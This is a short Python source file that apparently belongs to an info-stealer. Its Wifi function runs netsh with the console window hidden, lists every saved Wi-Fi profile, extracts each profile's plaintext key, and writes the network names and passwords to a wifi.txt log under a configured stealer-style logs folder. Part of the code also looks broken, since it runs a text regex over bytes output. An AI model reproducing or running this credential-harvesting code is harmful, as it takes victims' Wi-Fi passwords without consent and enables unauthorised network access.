from subprocess import STARTUPINFO, STARTF_USESHOWWINDOW, PIPE, check_output
from re import findall, search
from os import environ
from preferences.config import config

def Wifi():
    user = environ['USERPROFILE']
    pathToLogs = f'{user}\\{config.pathToLogs}\\System'
    logs = []
    startupinfo = STARTUPINFO()
    startupinfo.dwFlags |= STARTF_USESHOWWINDOW
    profiles_output = check_output(['netsh', 'wlan', 'show', 'profiles'], shell=True, stdin=PIPE, stderr=PIPE, startupinfo=startupinfo)
    profile_names = findall(':\s(.+)', profiles_output)

    wifi_passwords = {}

    for profile in profile_names:
        password_output = check_output(['netsh', 'wlan', 'show', 'profile', 'name=' + profile, 'key=clear'], shell=True, stdin=PIPE, stderr=PIPE, startupinfo=startupinfo)
        password = search('Key Content\s+:\s(.+)', str(password_output))

        if password:
            wifi_passwords[profile] = password.group(1)
        else:
            wifi_passwords[profile] = None

    passwords = wifi_passwords

    for profile, password in passwords.items():
        profile = profile.encode('cp1251', errors='ignore').decode('utf-8', errors='ignore')
        if password != None:
            password = password.encode('cp1251', errors='ignore').decode('utf-8', errors='ignore')

        logs.append(f'Wi-Fi Network: {profile}\nPassword: {password}\n')

    with open(pathToLogs+"\\wifi.txt", 'w', encoding='UTF-8') as f:
        for log in logs:
            f.write(log+'\n')